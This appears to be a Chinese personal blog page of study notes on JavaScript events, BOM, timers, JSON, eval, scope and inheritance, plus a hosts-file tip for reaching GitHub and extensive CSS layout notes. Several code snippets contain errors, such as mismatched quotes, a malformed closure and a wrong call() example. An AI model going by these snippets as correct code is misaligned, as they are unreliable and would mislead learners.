<h4 id="事件的绑定"><a href="#事件的绑定" class="headerlink" title="事件的绑定:"></a>事件的绑定:</h4><p>1 使用对象.事件&#x3D;函数 的形式绑定响应函数<br>它只能为一个元素的同一个事件绑定一次响应函数<br>不能绑定多个，如果绑定多个，则后面的会覆盖前面的</p>
<p>2 addEventListener()<br>可以为同一个元素的同一个事件绑定多个响应函数(ie8及以下不支持)<br>参数:<br>事件的字符串，不要on<br>回调函数，当事件触发时，该函数会被调用<br>是否在捕获阶段触发事件，需要一个值，一般都为false<br>btn1.addEventListener(“click”,function(){},false)<br>这里的this是绑定事件的对象</p>
<p>在ie8中可以使用<br>btn.attachEvent(“onclick”,function(){}）和上面不同的是 这个 是 事件后绑定先执行，<br>这里的this是window<br><br/></p>
<h4 id="事件的传播"><a href="#事件的传播" class="headerlink" title="事件的传播:"></a>事件的传播:</h4><p>W3C将事件传播分为3个阶段:<br>1 捕获阶段（先触发捕获 最后才触发冒泡）<br>从最外层的祖先元素向目标元素进行事件的捕获，但是默认此时不会触发事件</p>
<p>2 目标阶段<br>事件捕获到目标元素 捕获结束 开始在目标元素上触发事件</p>
<p>3 冒泡阶段<br>事件从目标元素向他的祖先元素传递，依次触发祖先元素上的事件</p>
<p>如果希望在捕获阶段触发事件，可以将addEventListener的第三个参数设置为true</p>
<p>在ie8及一下的浏览器中没有捕获阶段<br><br/></p>
<h4 id="拖拽"><a href="#拖拽" class="headerlink" title="拖拽:"></a>拖拽:</h4><p>取消事件</p>
<p>document.onmouseup&#x3D;null<br>当拖拽网页中的内容时,浏览器会默认在搜索引擎中搜索内容，<br>此时会导致拖拽功能的异常，这是浏览器提供的默认行为，<br>如果不希望出现这个行为,可以通过return false 来取消默认行为，但在ie8中不奏效</p>
<p>使用addEventListener绑定事件取消默认行为是不能使用return false,<br>而是使用event.preventDefault()<br><br/></p>
<h4 id="滚轮事件"><a href="#滚轮事件" class="headerlink" title="滚轮事件:"></a>滚轮事件:</h4><p>box1.onmousewheel&#x3D;function(event){但火狐不支持<br>event.wheelDelta 可以获取鼠标滚轮滚动的方向  正值向上  负值向下<br>}<br><br/></p>
<h4 id="键盘事件"><a href="#键盘事件" class="headerlink" title="键盘事件:"></a>键盘事件:</h4><p>一般都会绑定给一些可以获取到焦点的对象或者是document(input,..)<br>onkeydown：键盘被按下<br>onkeyup:键盘被松开</p>
<p>document.onkeydown&#x3D;function(event){<br>console.log(event.keyCode) 按键的编码<br>event.key  按键的名字</p>
<p>event.altKey<br>event.ctrlKey<br>event.shiftKey 这三个用来判断alt,ctrl,shift是否被按下，如若按下了则返回true</p>
<p>在文本框中输入内容，属于onkeydown的默认行为<br>使文本框中不能输入数字<br>if(event.keyCode&gt;&#x3D;48&amp;&amp;event.keyCode&lt;&#x3D;57){<br>return false;<br>}<br><br/></p>
<p>BOM对象:</p>
<p>BOM（Brower Object Model）：浏览器对象模型，可以通过js来操作浏览器</p>
<p>DOM(Document Object Model):文档对象模型</p>
<p>BOM对象:</p>
<p>Window 整个浏览器的窗口,同时也是网页中的全局对象</p>
<p>Navigator 当前浏览器的信息，可以用这个识别不同的浏览器</p>
<p>Location  浏览器的地址栏  可以获取地址栏信息,或者操作浏览器跳转页面，location&#x3D;”<a target="_blank" rel="noopener" href="http://www.baidu.com&quot;/">http://www.baidu.com&quot;</a> 或者 “01.html”直接跳转页面,并且会生成相对应的历史记录 ，location.reload(true):强制清空缓存刷新 location.assigin(“http:&#x2F;&#x2F;…”) 与location一样,location.replace(“http:&#x2F;&#x2F;…”)也能跳转，但不会生成历史记录</p>
<p>History 可以操作浏览器的历史记录，只能向前或向后翻页，只能在当次访问时有效,history.length:当前访问的链接数量（如果关闭浏览器就没了）,history.back():可以回到到上一个页面，和浏览器的回退按钮一样，history.forward():跳转到下一个页面，和浏览器的前进按钮一样，history.go() 可以跳转到指定的页面，需要一个整数作为参数 1表示向前跳转一个页面,-1表示向后跳转一个页面</p>
<p>Screen 用户的屏幕的信息,</p>
<p>这些BOM对象都是作为window对象的属性保存的<br>可以通过window的对象使用，也可以直接使用<br><br/></p>
<h4 id="定时器简介"><a href="#定时器简介" class="headerlink" title="定时器简介:"></a>定时器简介:</h4><p>setInterval(function(){},1000)<br>定时调用:每隔一段时间执行一次回调函数<br>时间单位是毫秒<br>返回一个number类型的数据<br>这个数字作为定时器的唯一标识</p>
<p>清除上面的定时器<br>var timer&#x3D;setInterval(…)<br>clearInterval(timer);<br>可以接收任意参数，<br>如果参数是一个有效的定时器标识，则会停止定时器<br>如果不是一个有效的标识，则什么也不会做</p>
<p>如果同时开启多个定时器，则会速度变快，需要在开启前清除掉上一个</p>
<p>setTimeout(function(){},300)<br>延时调用一个函数不马上执行，而是隔一段时间之后再执行，而且只会执行一次<br>clearTimeout(…)</p>
<p>定时器真的是定时执行的吗:<br>定时器并不能保证真正定时执行<br>一般会延迟一丁点(可以接受),也有可能延迟很长时间(不能接受:如 外面存在一个for循环  循环次数非常分大 1后面10个0,而定时器回调函数是在主线程执行的 并且js是单线程)</p>
<p>定时器是如何实现的:<br>事件循环模型<br><br/></p>
<h4 id="轮播图"><a href="#轮播图" class="headerlink" title="轮播图:"></a>轮播图:</h4><p>为每一个链接添加属性 all[i].num&#x3D;i;<br><br/></p>
<h4 id="类的操作"><a href="#类的操作" class="headerlink" title="类的操作:"></a>类的操作:</h4><p>可以修改元素class的属性来间接修改样式<br>box.className&#x3D;”m2”;</p>
<p>.m2{<br>…<br>}</p>
<p>box.className+&#x3D;” m2”<br><br/></p>
<h4 id="JSON"><a href="#JSON" class="headerlink" title="JSON:"></a>JSON:</h4><p>是一个特殊格式的字符串，这个字符串可以被任何的语言识别，主要用来数据的交互<br>‘{“name”:”涨潮”,”action”：”冲刷”}’<br>JSON中的属性名必须加双引号<br>JSON中允许的值：<br>1 字符串<br>2 布尔值<br>3 数值<br>4 null<br>5 对象(普通对象)<br>6 数组</p>
<p>JSON.parse()<br>可以将JSON字符串转换为js对象，<br>需要一个JSON字符串作为参数</p>
<p>JSON.stringify()<br>可以将一个js对象转换为JSON字符串</p>
<h4 id="eval"><a href="#eval" class="headerlink" title="eval:"></a>eval:</h4><p>eval（）<br>可以执行一段字符串形式的JS代码,并将执行结果返回<br>eval(“alert(‘hello’);”)</p>
<p>如果eval执行的过程中有{},它会将{}当成是代码块，<br>如果不希望将其当成代码块解析，则需要在字符串前后各加一个<br>如<br>‘{“name”:”涨潮”,”action”：”冲刷”}’ 改成<br> ‘({“name”:”涨潮”,”action”：”冲刷”})’<br>或者 eval(“(“+str+”)”)<br><br/></p>
<h4 id="变量声明提升与函数提升："><a href="#变量声明提升与函数提升：" class="headerlink" title="变量声明提升与函数提升："></a>变量声明提升与函数提升：</h4><p>变量提升在函数提升之前</p>
<p>通过var定义的变量，在定义语句之前就可以访问到，只是值为undefined<br>通过function声明的函数,在之前就可以直接调用<br><br/></p>
<h4 id="作用域与作用域链"><a href="#作用域与作用域链" class="headerlink" title="作用域与作用域链:"></a>作用域与作用域链:</h4><p>作用域:在编写代码时就确定了，和函数调用没有关系。<br>分类:<br>全局作用域<br>函数作用域<br>没有块作用域(ES6有了)<br>作用:<br>隔离变量,不同作用域下同名变量不会有冲突。</p>
<p>作用域链:<br>多个上下级关系的作用域形成的链,它的方向是从下往上的(从内到外)。<br>查找变量时就是沿着作用域链来查找的。</p>
<h4 id="循环遍历加监听"><a href="#循环遍历加监听" class="headerlink" title="循环遍历加监听:"></a>循环遍历加监听:</h4><p>for(var i&#x3D;0,length&#x3D;btns.length;i&lt;length;i++){<br>var btn&#x3D;btns[i];<br>btn.index&#x3D;i;&#x2F;&#x2F;将btn所对应的下标保存在btn上<br>btn.onclick&#x3D;function(){<br>alert(‘第+(this.index+1)+个’)<br>}</p>
<p>1 2 3 4 …</p>
<p>利用闭包同样可以实现:<br>for(var i&#x3D;0,length&#x3D;btns.length;i&lt;length;i++){<br>(function(i){ 这里据作用域是不同的，每次执行立即执行函数中的i和for循环里的i都不一样，因为作用域不同<br>var btn&#x3D;btns[i];<br>btn.onclick&#x3D;function(){<br>alert(‘第+(i+1)+个’)<br>}<br>)(i)<br>}<br><br/><br><br/></p>
<h4 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承:"></a>原型链继承:</h4><p>关键点:子类型的原型是父类型的一个实例对象<br>父类型:<br>function Supper(){<br>this.supProp&#x3D;”Supper property”;<br>}</p>
<p>Supper.prototype.showSupperProp&#x3D;function(){<br>console.log(this.supProp);<br>}</p>
<p>子类型:<br>function Sub(){<br>this.subProp&#x3D;”Sub property”;<br>}</p>
<p>Sub.prototype.showSubProp&#x3D;function(){<br>console.log(this.subProp);<br>}</p>
<p>vra sub&#x3D;new Sub();<br>sub.showSupperProp();报错<br>sub.toString();可以 （内部执行了一句代码:Sub.prototype&#x3D;{}；透过这个对象可以看到 object.prototype身上的toString方法）</p>
<p>所以想让子类型实例对象看到父类型中的方法，需加上:<br>Sub.prototype&#x3D;new Supper();</p>
<p>此时 Sub.constructor 是 Supper函数，因为这个construtor构造器属性只在原型对象身上(即Sub.prototype),并且人为指向了Supper实例对象</p>
<p>所以还应该加上；<br>Sub.prototype.constructor&#x3D;Sub;让子类型的原型的constructor指向子类型<br><br/><br><br/></p>
<h4 id="借用构造函数继承（假的）"><a href="#借用构造函数继承（假的）" class="headerlink" title="借用构造函数继承（假的）:"></a>借用构造函数继承（假的）:</h4><p>s实际上只是简化了代码(借用其他函数初始化了一些相同的属性)<br>关键：在子类型的构造函数中通过call（）调用父类型的构造函数<br>function Person(name,age){<br>this.name&#x3D;name;<br>this.age&#x3D;age;<br>}</p>
<p>function Student(name,age,price){<br>Person.call(this,age,price);相当于 this.age&#x3D;age;this.price&#x3D;price;<br>this.price&#x3D;price;<br>}</p>
<p>new Student(‘Tom’,20,100);</p>
<h4 id="浏览器内核"><a href="#浏览器内核" class="headerlink" title="浏览器内核:"></a>浏览器内核:</h4><p>是支撑浏览器运行的最核心的程序:<br>Chrome,Safari：webkit<br>firefox：Gecko<br>IE：Trident<br>360,搜狗等国内浏览器:Trident+webkit（双核双驱动）</p>
<p>不同的浏览器可能不一样</p>
<p>内核由很多模块组成：<br>内核是一个比较大的程序，有很多模块<br>如:<br>js引擎(也是代码，起到一个解释的作用)模块:负责js程序的编译与运行 </p>
<p>html,css文档解析模块:负责页面文本的(如输入百度网址回车后  最先得到(读取)html,css的文本，然后进行拆解(根据一定的规则拆解，如标签  html,body,…))</p>
<p>Dom&#x2F;Css模块:负责dom&#x2F;css在内存中的相关处理(如看到一个p 标签，会生成一个p标签对象，这个对象还会有top,left,等一些如何显示的数据)</p>
<p>布局和渲染模块:负责页面的布局和效果的绘制(参照内存中的对象)</p>
<p>（以上四个模块运行在 主线程）</p>
<p>(以下的模块是运行在 分线程)<br>定时器模块:负责定时器的管理(如 setTimeout(fn,3s)，但里面的fn回调函数是在主线程中运行的)<br>事件管理模块:负责事件的管理(如 对一个按钮进行监听)<br>网络请求模块:负责ajax请求</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/02/14/js1/" data-id="cl1dgisuf0004ngnogwo48qqn" data-title="js1" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-github官网快速进入的方法" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/02/14/github%E5%AE%98%E7%BD%91%E5%BF%AB%E9%80%9F%E8%BF%9B%E5%85%A5%E7%9A%84%E6%96%B9%E6%B3%95/" class="article-date">
  <time class="dt-published" datetime="2022-02-14T05:45:50.000Z" itemprop="datePublished">2022-02-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/02/14/github%E5%AE%98%E7%BD%91%E5%BF%AB%E9%80%9F%E8%BF%9B%E5%85%A5%E7%9A%84%E6%96%B9%E6%B3%95/">github官网快速进入的方法</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>C:\Windows\System32\drivers\etc 在hosts文件中最后添加<br>#github<br>140.82.114.3 github.com<br>199.232.69.194 github.global.ssl.fastly.net</p>
<p>ip地址需要在<a target="_blank" rel="noopener" href="https://ipaddress.com/%E4%B8%AD%E6%9F%A5%E6%89%BE">https://ipaddress.com/中查找</a></p>
<p>最后在cmd窗口执行 ipconfig &#x2F;flushdns 来刷新DNS缓存</p>
<p>还可以在cmd窗口中输入 ping github.com 查询github.com&#x2F;的访问时间</p>
<p>或者换网  从wifi到热点（数据线连接)，从热点到wifi</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/02/14/github%E5%AE%98%E7%BD%91%E5%BF%AB%E9%80%9F%E8%BF%9B%E5%85%A5%E7%9A%84%E6%96%B9%E6%B3%95/" data-id="cl1dgisuc0003ngnohlf8f2i1" data-title="github官网快速进入的方法" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CSS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/02/11/CSS/" class="article-date">
  <time class="dt-published" datetime="2022-02-10T16:59:54.000Z" itemprop="datePublished">2022-02-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/02/11/CSS/">CSS</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="盒模型"><a href="#盒模型" class="headerlink" title="盒模型:"></a>盒模型:</h4><p>每个盒子都由 内容区(content) 内边距(padding) 边框(border) 外边距(margin) 组成</p>
<p>内容区由width 和 height决定</p>
<p>border-width:<br>四个值: 上 右 下 左</p>
<p>三个值:上 左右 下</p>
<p>两个值: 上下 左右</p>
<p>一个值: 四个方向</p>
<p>border-color值的设置也与border-width一样<br>padding值的设置也是一样的</p>
<p>若添加background-color属性，并且添加padding-top<br>那么除了内容区(content)会有背景色外，内边距区域也会有背景色<br>边框(border)不会受到影响</p>
<p>外边距不会影响可见框的大小，但会影响盒子的位置</p>
<p>元素在页面中是按照自左向右边排列的<br>默认情况下如果设置左和上外边距 则会移动元素自身<br>如果是设置右和下外边距则会移动其他元素<br>（如果margin取赋值  移动的方向改变  但移动的对象还是与正值时的对象一样）</p>
<p>盒子实际占用空间（包括margin部分）</p>
<p>IE盒子模型:box-sizing:border-box;(怪异模式) width&#x2F;height属性包含padding和border+内容区</p>
<p>W3C标准盒子模型:box-sizing:content-box;（标准模式）默认模式 width&#x2F;height属性包含不包含padding和border </p>
<p>默认情况下:盒子可见框的大小由边框，内边距，内容区组成</p>
<p>默认值: content-box </p>
<br/>
<br/>
#### 垂直外边距: ####
相邻的情况:
当上面盒子设置 margin-bottom

<p>下面盒子设置 margin-top</p>
<p>这其中的间距 取其中的最大值</p>
<p>特殊情况:<br>如果相邻的外边距一正一负,取他们的和<br>如果相邻的外边距都是负的,取其中绝对值较大的</p>
<p>父子的情况:<br>给子元素设置上外边距,它会传给父元素，导致整体移动<br>解决方法:<br>给父元素设置border(起到隔开的作用)<br><br/><br><br/></p>
<h4 id="display的可选值"><a href="#display的可选值" class="headerlink" title="display的可选值:"></a>display的可选值:</h4><p>inline 转换成行内<br>block  转成块级<br>inline-block 转成行内块<br>table  将元素设置为一个表格<br>none   元素不会在页面中显示<br>flex   弹性盒子<br><br/><br><br/></p>
<h4 id="隐藏元素的方式与区别"><a href="#隐藏元素的方式与区别" class="headerlink" title="隐藏元素的方式与区别:"></a>隐藏元素的方式与区别:</h4><p>display:none 隐藏元素 不会占据位置（不是代表元素标签不在）</p>
<p>visibility: hidden 隐藏元素  仍然占据位置</p>
<p>height:0;overflow:hidden;<br><br/><br><br/></p>
<h4 id="有序列表与无序列表"><a href="#有序列表与无序列表" class="headerlink" title="有序列表与无序列表:"></a>有序列表与无序列表:</h4><p>无序 ul</p>
<p>有序 ol</p>
<p>定义列表</p>
<p>dl创建一个定义列表<br>dt表示定义的内容<br>dd对内容进行解释说明</p>
<p>dl dt dd都是块级<br><br/><br><br/></p>
<h4 id="超链接："><a href="#超链接：" class="headerlink" title="超链接："></a>超链接：</h4><p>a 行内  里面可以嵌套除了自身外的任何元素(如果嵌套了自身，还是算作两对同级的a标签)</p>
<p>a href&#x3D;”2.html”  除了能跳指定网站，还能跳转到其他页面</p>
<p>a target&#x3D;”_self” 在当前页打开超链接</p>
<p>a  target&#x3D;”_blank”  在新的页面打开超链接</p>
<p>href&#x3D;”#”  直接跳转到当前页的顶部位置</p>
<p>跳转到页面中的任意位置(如：底部)</p>
<p>a href&#x3D;”#bottom” </p>
<p>a id&#x3D;”bottom”（是放在底部的 这里可以是任意标签 但id是必要条件）</p>
<p>a  href&#x3D;”javascript:;” 点击后什么都不会发生<br>href&#x3D;””  默认为#<br><br/><br><br/></p>
<h4 id="相对路径"><a href="#相对路径" class="headerlink" title="相对路径:"></a>相对路径:</h4><p>如果不写.&#x2F;也不写 ..&#x2F;  ，相当于写了.&#x2F;<br>.&#x2F; 表示当前文件夹内查找<br><br/><br><br/></p>
<h4 id="img标签"><a href="#img标签" class="headerlink" title="img标签:"></a>img标签:</h4><p>自结束标签 替换元素<br>img src&#x3D;””   绝对路径（如:http:&#x2F;&#x2F;…）和相对路径都可以</p>
<p>alt&#x3D;””  图片无法加载出来时显示的信息,主要是给搜索引擎识别图片</p>
<p>width&#x3D;””   若设置宽或高其中一个属性值 则另外一个会等比例缩放,若同时设置两个 则不会</p>
<p>图片属于网页中的外部资源，外部资源都需要浏览器单独发送请求加载。</p>
<p>浏览器加载外部资源时是按需加载的，用则加载，不用则不加载</p>
<p>a:link  (a标签默认就是处于这个状态)</p>
<p>a:link 会首先加载,而a：active 和 a:hover 会在指定状态触发时加载<br><br/><br><br/></p>
<h4 id="内联框架"><a href="#内联框架" class="headerlink" title="内联框架:"></a>内联框架:</h4><p>iframe src&#x3D;””  向当前页面中引入一个其它页面（图片地址也行,引入相对路径下的页面也行）<br>frameborder&#x3D;”0” 边框<br><br/><br><br/></p>
<h4 id="音频与视频标签"><a href="#音频与视频标签" class="headerlink" title="音频与视频标签:"></a>音频与视频标签:</h4><p>audio src&#x3D;”” 引入外部的音频文件  默认是没有任何显示的<br>必须加上 controls(加上就行了，不需要给值)<br>autoplay 自动播放(大部分浏览器不支持，但IE9及以上支持)<br>loop  播放完之后又自动从开始播放<br>在不同浏览器中显示的可能不一样</p>
<p>audio controls<br>文字提示。。。<br>source src&#x3D;”   可以用source来指定文件的路径<br>对于支持audio标签的直接会找到source标签,对于不支持audio标签的，自然不会找到source标签，所以文字就会显示出来</p>
<p>若同时指定多个source（对于不同浏览器支持的文件格式不一样，主要是以前的老版，现在几乎没了） 从第一个开始 若支持此文件格式 就用它 ，不会管后面的，若所有都不支持，则出现文字</p>
<p>embed src&#x3D;”  width&#x3D;” height&#x3D;” 对ie8及以下支持(这个标签一般放在source平级的最后面<br>type&#x3D;”audio&#x2F;mp3” </p>
<p>写完这些，所有浏览器就都支持了，所以文字就不要了</p>
<p>视频标签<br>video 与上面一样的<br><br/><br><br/></p>
<h4 id="样式可编写的位置"><a href="#样式可编写的位置" class="headerlink" title="样式可编写的位置:"></a>样式可编写的位置:</h4><p>1 标签内 style&#x3D;”” 开发中禁止使用</p>
<p>2 &lt;style…</p>
<p>3 外联样式 .css文件   link rel&#x3D;”stylesheet” href&#x3D;””<br>  使样式在不同页面中得到复用<br>  这种访问速度更快 利用到了浏览器的缓存机制<br><br/><br><br/></p>
<h4 id="选择器"><a href="#选择器" class="headerlink" title="选择器:"></a>选择器:</h4><p>交集选择器:<br>p class&#x3D;”a<br>p.a{… 同时满足p标签 又满足类名a<br>class&#x3D;”a b c” 多个类名<br>.a.b.c{…<br>并集选择器:<br>.a,span{…<br>子元素选择器:<br>ul&gt;li</p>
<p>后代选择器:<br>ul li (子元素也是后代选择器)</p>
<p>兄弟选择器:<br>p &#x2F;p&gt;<br>span &#x2F;span</p>
<p>p+span  选择p元素的兄弟元素span<br>&lt;+ 代表 紧挨着p标签的  ，下一个，隔了一个标签就不算</p>
<p>p~span  代表选择p标签下面所有的兄弟元素span</p>
<p>属性选择器:</p>
<p title=""   
鼠标放上去后显示的提示内容

<p>p[title]{…表示选中p元素同时还带有title属性</p>
<p title="abc" 这里引号也可以去掉

<p>p[title&#x3D;”abc”]  还可以指定title属性的值 特指 </p>
<p>p[title^&#x3D;”abc”]  选中title属性值以abc开头的</p>
<p>p[title$&#x3D;”abc” 选中title属性值以abc结尾的</p>
<p>p[title*&#x3D;”abc”] 选中title属性值中存在abc的</p>
<p>伪类选择器:</p>
<p>ul&gt;li:first-child{…第一个li</p>
<p>ul&gt;li:last-child{…最后一个li</p>
<p>ul&gt;li:nth-child(3){…第3个li 特殊值:n  代表从0到正无穷，即选中了所有</p>
<p>值为2n或even:选中所有偶数(0没有，从2开始)<br>值为2n+1或odd：选中所有奇数</p>
<p>:first of type<br>:last of type<br>:nth of type </p>
<p>这三个和上面类似，唯一不同的是  这三个是指同类型的</p>
<p>否定伪类<br>ul&gt;li:not(:nth-child(3))</p>
<p>伪元素选择器:<br>p::first-letter{… p标签中的第一个字母</p>
<p>p::first-line{… p标签中的第一行</p>
<p>p::selection{… p标签中选中的内容</p>
<p>p::before{… 元素的开始 这两个是不会被上面::selection选中的</p>
<p>p::after{… 元素的最后<br><br/><br><br/></p>
<h4 id="行内元素与块级元素"><a href="#行内元素与块级元素" class="headerlink" title="行内元素与块级元素:"></a>行内元素与块级元素:</h4><p>块元素:在网页中用来对页面布局<br>特点:独占一行 不能与其他元素并排<br>可以设置宽高，如果不设置宽度，那么宽度默认变为父级的100%</p>
<p>行内元素:主要用来包裹文字<br>特点:与其他行内元素并排<br>不能设置宽高，默认宽度就是文字的宽度</p>
<p>一般情况下，会在块级元素中放行内元素，而 不会 在行内元素中放块元素<br>p元素中不能放任何的块元素</p>
<h4 id="语义化标签"><a href="#语义化标签" class="headerlink" title="语义化标签:"></a>语义化标签:</h4><p>em  行内  让字体倾斜</p>
<p>strong 行内  加粗字体</p>
<p>q  行内  引号 </p>
<p>h1~h6 （h1字体最大）</p>
<p>p（p元素内不能放块级元素）</p>
<p>header 块级 表示网页头部<br>main  块级 表示网页主体部分<br>footer 块级 表示网页底部<br>nav 块级 表示网页中的导航<br>aside  块级 表示网页的侧边栏<br>article 块级 表示文章<br>section 块级 表示区块</p>
<p>单个的:<br>br  换行<br><br/><br><br/></p>
<h4 id="权重的比较"><a href="#权重的比较" class="headerlink" title="权重的比较:"></a>权重的比较:</h4><p>！important   权重最高   （这个在开发中能不用就不用）<br>内联  1000<br>id    100<br>类和伪类，属性选择器 10<br>元素      1<br>通配     0<br>继承     没有优先级</p>
<p>div#box1  权重是叠加的   1 + 100 &#x3D;101</p>
<p>div,p,span   分组选择器是单独计算的</p>
<p>不能跨数量级<br>如果优先级计算相同，则优先使用靠下的样式<br><br/><br><br/></p>
<h4 id="像素与百分比"><a href="#像素与百分比" class="headerlink" title="像素与百分比:"></a>像素与百分比:</h4><p>像素:屏幕(显示器)实际是由一个一个小点点（正方形）构成的<br>不同屏幕的像素大小是不同的，像素越小的屏幕显示的效果越清晰<br> 所以同样的200px在不同设备下显示效果不一样</p>
<p>百分比:可以将属性设置为相对于父元素的百分比<br>使子元素跟随父元素的改变而改变<br><br/><br><br/></p>
<h4 id="em与rem"><a href="#em与rem" class="headerlink" title="em与rem:"></a>em与rem:</h4><p>em是相对自身的字体大小设置的 ，默认为 1em &#x3D; 16px<br>这个font-size属性可以自己定义</p>
<p>rem 是相对于根元素的字体大小(即html)设置的<br><br/><br><br/></p>
<h4 id="RGB"><a href="#RGB" class="headerlink" title="RGB:"></a>RGB:</h4><p>通过三种颜色的不同浓度调配出不同的值<br>每一种颜色的范围在0~255(0% ~ 100%)之间</p>
<p>R :red</p>
<p>G:green</p>
<p>B：blue</p>
<p>蓝色:  background-color:rgb（0,0,255）</p>
<p>黑色: 0,0,0<br>白色: 255,255,255</p>
<p>rgba(0,0,0,.5)  第四个值表示透明度  .5代表0.5  1代表不透明 0表示完全透明</p>
<p>16进制的rgb值<br>语法#红绿蓝<br>颜色浓度在 00 - ff之间<br>background-color:#ff0000 红色</p>
<p>如果颜色两位两位重复则可以简写 如上面可以简写成 #f00</p>
<p>项 #aabbcd  则不能简写了<br><br/><br><br/></p>
<h4 id="HSL："><a href="#HSL：" class="headerlink" title="HSL："></a>HSL：</h4><p>H :色相（取值范围 0 - 360，一个环）</p>
<p>S: 饱和度(颜色的浓度 0% - 100%)</p>
<p>L: 亮度(0% - 100%)</p>
<p>红色  background-color:hsl(0, 100%, 50%);</p>
<p>hsla（, , , x,） x表示透明度<br><br/><br><br/></p>
<h4 id="过度约束"><a href="#过度约束" class="headerlink" title="过度约束:"></a>过度约束:</h4><p>一个元素在其父元素中，水平布局必须要满足一下的等式:<br>margin-left + border-left + padding-left + width + padding-right+ border-right + margin-right &#x3D; 其父元素内容区的宽度(必须满足)</p>
<p>如果相加结果使等式不成立，则称为过渡约束,则等式会自动调整</p>
<p>调整情况:</p>
<p>如果这七个值中没有auto的情况,则浏览器会自动调整margin-right的值来使等式成立</p>
<p>这七个值中有三个值可以设置为auto<br>width<br>margin-left<br>margin-right</p>
<p>width若为auto,（若其它值为0）则width和父元素内容区一样宽，<br>若其它有值,则auto&#x3D;父内容区宽 - 其他值宽和<br>如果同时将width和（一个或两个）外边距设置为auto ,则width会调整到最大，外边距会自动调整为0<br>如果将两个外边距设置为auto ,宽度固定,那么会两个外边距的值是相同的</p>
<p>如果其他值为0 宽度大于父元素内容区 则调整margin-right为负值<br><br/><br><br/></p>
<h4 id="轮廓阴影与圆角"><a href="#轮廓阴影与圆角" class="headerlink" title="轮廓阴影与圆角:"></a>轮廓阴影与圆角:</h4><p>起到边框作用但不会影响壳子可见框大小（周围的元素的布局不会受到影响),outline:10px solid blue;</p>
<p>box-shadow 默认处于元素内，默认是看不见的<br>  10px               10px            50px     black;<br>  水平向右移动        垂直向下移动   设置阴影的模糊半径</p>
<p>四个圆角<br>border-radius: 左上 右上 右下 坐下</p>
<p>三个值  左上  右上&#x2F;下左 右下</p>
<p>border-top-left-radius<br>border-top-right-radius<br>border-bottom-right-radius<br>border-bottom-left-radius</p>
<p>若border-bottom-right-radius:50px;  在右边底部的顶点处  向左50px处  向上50px处  垂直画线 焦点处就是圆心  半径为 50px  然后和原来的两个点相切 出来的圆角</p>
<p>border-radius: 20px &#x2F; 40px ;横向20px 纵向 40px</p>
<p>border-radius:50% 将元素设置为一个圆形<br><br/><br><br/></p>
<h4 id="浮动"><a href="#浮动" class="headerlink" title="浮动:"></a>浮动:</h4><p>三个值<br>none 默认值 元素不浮动<br>left<br>right</p>
<p>设置浮动的元素，会完全从文档流中脱离，不再占用文档流的位置<br>设置浮动以后，元素会向父元素的左边或者右边移动<br>浮动元素默认不会从父元素中移出<br>浮动元素向左或者向右移动时，不会超过它前面的其他浮动元素<br>浮动元素不会超过它前边浮动的兄弟元素，最多最多就是和它一样高<br>浮动元素不会盖住文字，文字会自动环绕在浮动元素周围</p>
<p>脱离文档流的特点:</p>
<p>1 块元素不再独占页面的一行</p>
<p>2 脱离文档流以后，块元素的宽度和高度默认被内容撑开</p>
<p>脱离文档流后，不需要再区分块和行内了<br><br/><br><br/></p>
<h4 id="BFC"><a href="#BFC" class="headerlink" title="BFC:"></a>BFC:</h4><p>在浮动布局中，父元素的高度默认是被子元素撑起的，<br>当子元素浮动后，会完全脱离文档流，将不会撑起父元素的高度</p>
<p>开区BFC的元素会变成一个独立的布局区域</p>
<p>特点:<br>开启BFC的元素不会被浮动元素覆盖<br>开启BFC的元素子元素和父元素外边距不会重叠(例子:给子元素margin-top不会作用到父元素身上)<br>开启BFC的元素可以包裹住浮动的元素，不会出现高度塌陷</p>
<p>开启方式:</p>
<p>1 float:left&#x2F;right（缺点:脱流，宽度被内容撑开）</p>
<p>2 display:inline-block(缺点:宽度被内容撑开)&#x2F;table-cell&#x2F;table-caption&#x2F;flow-root</p>
<p>3 overflow:auto&#x2F;hidden&#x2F;scroll（缺点:这个值有滚动条）</p>
<p>4 position:absolute&#x2F;fixed</p>
<p>此外解决高度坍塌方法还有:<br>clear:<br>作用:清除浮动元素对当前元素所产生的影响</p>
<p>left  清除左侧浮动元素对当前元素所产生的影响<br>right 清除右侧浮动元素对当前元素所产生的影响<br>both  清除两侧中影响最大的那侧</p>
<p>原理:设置清除浮动以后，浏览器会自动为元素添加一个上外边距</p>
<p>这个也可以解决高度塌陷问题</p>
<p>子元素末尾添加一个div ，然后给这个元素添加clear:both 属性</p>
<p>在父元素身上添加 ::after (默认为行内元素)</p>
<p>给属性:<br>content:’’;<br>clear:both;<br>display:block;</p>
<p>同时解决高度塌陷和外边距重叠:<br>.clearfix::before,<br>.clearfix:after{<br>content:’’;<br>display:table;<br>clear:both;<br><br/><br><br/></p>
<h4 id="相对定位"><a href="#相对定位" class="headerlink" title="相对定位:"></a>相对定位:</h4><p>特点:<br>【相对于自身原来的位置（文档流中的位置，更细致就是指 元素的左上角的一个点，画两条线，向右是x轴正方向，向下是y轴正方向），如 想要移动到在元素的位置上边 top 取负值，自身原来的位置还会被保留下来】</p>
<p>开启相对定位的元素如果不设置偏移量(offset 即 top bottom left right)，元素不会有任何的变化</p>
<p>相对定位会提高元素的层级，会高于文档流中的元素</p>
<p>相对定位不会使元素脱离文档流</p>
<p>相对定位不会改变元素的性质 块级还是块级 行内还是行内</p>
